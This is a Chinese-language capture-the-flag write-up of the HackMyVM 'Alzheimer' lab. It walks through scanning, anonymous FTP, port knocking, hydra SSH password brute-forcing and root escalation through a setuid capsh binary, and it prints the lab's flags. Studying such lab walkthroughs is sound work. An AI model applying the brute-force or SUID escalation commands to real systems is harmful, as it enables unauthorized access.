---
title: Alzheimer
author: hgbe02
date: 2024-04-12
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Alzheimer.html"
---

# alzheimer

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121621563.png" alt="image-20240412153023085" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121621564.png" alt="image-20240412153113588" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
rustscan -a 172.20.10.4 -- -A
```

```text
Open 172.20.10.4:80
Open 172.20.10.4:21
```

```text
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.20.10.8
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    syn-ack nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
Service Info: OS: Unix
```

### 目录扫描

```bash
gobuster dir -u http://172.20.10.4 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,git,jpg,txt,png
```

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.20.10.4
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,zip,git,jpg,txt,png
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 301) [Size: 185] [--> http://172.20.10.4/home/]
/admin                (Status: 301) [Size: 185] [--> http://172.20.10.4/admin/]
/secret               (Status: 301) [Size: 185] [--> http://172.20.10.4/secret/]
Progress: 1543920 / 1543927 (100.00%)
===============================================================
Finished
===============================================================
```

## 漏洞发现

### 踩点

```apl
http://172.20.10.4
```

```text
I dont remember where I stored my password :( I only remember that was into a .txt file... -medusa 
```

### 访问敏感端口

查看一下ftp服务：

```bash
┌──(kali💀kali)-[~/temp/alzheimer]
└─$ ftp 172.20.10.4                                                
Connected to 172.20.10.4.
220 (vsFTPd 3.0.3)
Name (172.20.10.4:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
Remote directory: /
ftp> ls -la
229 Entering Extended Passive Mode (|||59901|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        113          4096 Oct 03  2020 .
drwxr-xr-x    2 0        113          4096 Oct 03  2020 ..
-rw-r--r--    1 0        0             116 Apr 12 03:31 .secretnote.txt
226 Directory send OK.
ftp> get .secretnote.txt
local: .secretnote.txt remote: .secretnote.txt
229 Entering Extended Passive Mode (|||52929|)
150 Opening BINARY mode data connection for .secretnote.txt (116 bytes).
100% |***********************************************************************************************************|   116        5.02 MiB/s    00:00 ETA
226 Transfer complete.
116 bytes received in 00:00 (206.34 KiB/s)
ftp> exit
221 Goodbye.

┌──(kali💀kali)-[~/temp/alzheimer]
└─$ cat .secretnote.txt                                                                                                          
I need to knock this ports and 
one door will be open!
1000
2000
3000
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
```

尝试knock一下：

```bash
┌──(kali💀kali)-[~/temp/alzheimer]
└─$ knock 172.20.10.4 1000 2000 3000 -v
hitting tcp 172.20.10.4:1000
hitting tcp 172.20.10.4:2000
hitting tcp 172.20.10.4:3000
```

扫描一下：

```bash
rustscan -a 172.20.10.4 -- -A 

Open 172.20.10.4:21
Open 172.20.10.4:22
Open 172.20.10.4:80

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.20.10.8
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b1:3b:2b:36:e5:6b:d7:2a:6d:ef:bf:da:0a:5d:2d:43 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDs85YDBcxYDtBVawUlW6wndoVx691rVPkDX1AZvqf11RRhMsmwAg/1Du8YK/1ZSEmRXgHTvku0QEKNbRUxmFiD++cLKQEf9G23IjnauIX6oQHcY2mzeSHduiGzDvCNc0m6HhAODMWGbVoA77V63WSJ/bf1gC7JxxObyma0BNgeYbTQQUrMsHAsIr2cJhV19W5KL5Kq46jfYLTbFxnAs+qKC9vXAw6qaxy/1hHtc+iIhUNs5c/olTqWPPJ1gh0v6wthdeKb6BvyodbpMOhLOvZ6TPF3ZVaSmnZCAKxb6h7nbiOGroI65F+Cs0oWulVQYw+Bm7u2eZFLLQeWfMC5xUz5
|   256 35:f1:70:ab:a3:66:f1:d6:d7:2c:f7:d1:24:7a:5f:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNRlZlETQeEZ1ir3SKl9NFhI0TNnA+WtTRef7JwxnvOJ6ZbYjA3YvIMkUUriD9LbRPtEcAkAznKsszdMmmn1QeE=
|   256 be:15:fa:b6:81:d6:7f:ab:c8:1c:97:a5:ea:11:85:4e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIARsN37DwrXI1N7ruOs+QzaKlmXNmdVtID5/Qyi2SlvL
80/tcp open  http    syn-ack nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

开放了22端口。

### 访问敏感目录

```apl
http://172.20.10.4/admin/
```

```bash
403 Forbidden
nginx/1.14.2
```

```apl
http://172.20.10.4/secret/
```

```bash
Maybe my password is in this secret folder? 
```

```apl
http://172.20.10.4/home/
```

```bash
Maybe my pass is at home! -medusa 
```

重新扫一下：

```bash
┌──(kali💀kali)-[~/temp/alzheimer]
└─$ feroxbuster -u http://172.20.10.4 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d 2 -s 200 301 302
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.20.10.4
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 2
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        5l       27w      132c http://172.20.10.4/
301      GET        7l       12w      185c http://172.20.10.4/home => http://172.20.10.4/home/
301      GET        7l       12w      185c http://172.20.10.4/admin => http://172.20.10.4/admin/
301      GET        7l       12w      185c http://172.20.10.4/secret => http://172.20.10.4/secret/
301      GET        7l       12w      185c http://172.20.10.4/secret/home => http://172.20.10.4/secret/home/
```

尝试访问：

```apl
http://172.20.10.4/secret/home/
```

```bash
Im trying a lot. Im sure that i will recover my pass! -medusa

<!---. --- - .... .. -. --. -->
```

解密一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121621566.png" alt="image-20240412155421132" style="zoom:50%;" />

用户名应该是`medusa`，密码尝试：

```text
OTHING
othing
pass
pass!
-medusa
Ihavebeenalwayshere!!!
Ihavebeenalwayshere
one door will be open!
```

先爆破一下？

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121621567.png" alt="image-20240412155903778" style="zoom:50%;" />

不对，难道是大小写？

```bash
ihavebeenalwayshere!!!
ihavebeenalwayshere!!
ihavebeenalwayshere!
ihavebeenalwayshere
Medusa
Pass
Pass!
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121621568.png" alt="image-20240412160548556" style="zoom:50%;" />

额。。。。

可能漏了啥东西，回头再看看，主页它说它的密码在一个txt文件中，而txt文件只有一个，将里面的字符整理为一个字典，然后爆，爆个毛，我参数写错了。。。

看到了吗`hydra -P`参数我写成了`-p`，哈哈哈：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121621569.png" alt="image-20240412161502627" style="zoom:50%;" />

出来辣！！！

尝试连接：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121621570.png" alt="image-20240412161545326" style="zoom: 50%;" />

## 提权

### 信息搜集

```bash
medusa@alzheimer:~$ pwd
/home/medusa
medusa@alzheimer:~$ ls -la
total 32
drwxr-xr-x 3 medusa medusa 4096 Oct  3  2020 .
drwxr-xr-x 3 root   root   4096 Oct  2  2020 ..
-rw-r--r-- 1 medusa medusa  220 Oct  2  2020 .bash_logout
-rw-r--r-- 1 medusa medusa 3526 Oct  2  2020 .bashrc
drwxr-xr-x 3 medusa medusa 4096 Oct  3  2020 .local
-rw-r--r-- 1 medusa medusa  807 Oct  2  2020 .profile
-rw-r--r-- 1 medusa medusa   19 Oct  3  2020 user.txt
-rw------- 1 medusa medusa  107 Oct  3  2020 .Xauthority
medusa@alzheimer:~$ cat user.txt 
HMVrespectmemories
medusa@alzheimer:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/sbin/capsh
medusa@alzheimer:~$ file /usr/sbin/capsh
/usr/sbin/capsh: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=59572cc89caf302f03aba7f3a6778088d476b579, stripped
medusa@alzheimer:~$ sudo -l
Matching Defaults entries for medusa on alzheimer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User medusa may run the following commands on alzheimer:
    (ALL) NOPASSWD: /bin/id
medusa@alzheimer:~$ file /bin/id
/bin/id: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f940fbdb75f5fe6de351de744d0cb0384b88f355, stripped
```

找一下利用方法：https://gtfobins.github.io/gtfobins/capsh/

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121621571.png" alt="image-20240412161957411" style="zoom:50%;" />

尝试利用：

```bash
medusa@alzheimer:~$ capsh --gid=0 --uid=0 --
-bash: capsh: command not found
medusa@alzheimer:~$ /usr/sbin/capsh --gid=0 --uid=0 --
root@alzheimer:~# whoami;id
root
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(medusa)
root@alzheimer:~# cd /root
root@alzheimer:/root# ls -la
total 24
drwx------  3 root root 4096 Oct  3  2020 .
drwxr-xr-x 18 root root 4096 Oct  2  2020 ..
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4096 Oct  2  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r-----  1 root root   16 Oct  3  2020 root.txt
root@alzheimer:/root# cat root.txt 
HMVlovememories
```

拿到flag！！！lol！！！

